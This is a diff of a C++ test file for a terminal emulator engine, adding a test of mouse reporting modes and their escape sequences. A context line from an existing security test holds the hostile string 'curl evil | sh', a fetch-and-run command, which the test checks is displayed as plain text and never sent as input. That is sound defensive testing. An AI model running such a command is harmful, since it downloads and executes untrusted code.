@@ -280,3 +280,36 @@ TEST(VtEngineSecurity, Osc52AndHostileOutputProduceNoInput) {
     EXPECT_EQ(e.take_pty_input(), "");
     EXPECT_EQ(e.snapshot().row_text(1), " curl evil | sh");  // rendered as plain text only
 }
+
+// Mouse reporting: nothing is sent until the program asks; SGR (1006) encodes press/release
+// with 1-based cells; drag mode adds motion only while a button is held.
+TEST(VtEngine, MouseIsReportedOnlyInTheModeTheProgramAsked) {
+    using agentdesk::terminal::MouseAction;
+    using agentdesk::terminal::MouseMode;
+    VtEngine e;
+    e.mouse(2, 4, 1, MouseAction::kPress);
+    EXPECT_EQ(e.take_pty_input(), "");
+    EXPECT_EQ(e.snapshot().mouse, MouseMode::kNone);
+
+    e.feed("\x1b[?1000h\x1b[?1006h");
+    EXPECT_EQ(e.snapshot().mouse, MouseMode::kClick);
+    e.mouse(2, 4, 1, MouseAction::kPress);
+    e.mouse(2, 4, 1, MouseAction::kRelease);
+    EXPECT_EQ(e.take_pty_input(), "\x1b[<0;5;3M\x1b[<0;5;3m");
+    e.mouse(3, 4, 0, MouseAction::kMove);  // click mode: no motion
+    EXPECT_EQ(e.take_pty_input(), "");
+    e.mouse(0, 0, 4, MouseAction::kPress);  // wheel up
+    EXPECT_EQ(e.take_pty_input(), "\x1b[<64;1;1M");
+
+    e.feed("\x1b[?1002h");
+    EXPECT_EQ(e.snapshot().mouse, MouseMode::kDrag);
+    e.mouse(1, 1, 1, MouseAction::kPress);
+    e.mouse(1, 2, 0, MouseAction::kMove);
+    e.mouse(1, 2, 1, MouseAction::kRelease);
+    EXPECT_EQ(e.take_pty_input(), "\x1b[<0;2;2M\x1b[<32;3;2M\x1b[<0;3;2m");
+
+    e.feed("\x1b[?1002l");
+    EXPECT_EQ(e.snapshot().mouse, MouseMode::kNone);
+    e.mouse(1, 1, 1, MouseAction::kPress);
+    EXPECT_EQ(e.take_pty_input(), "");
+}
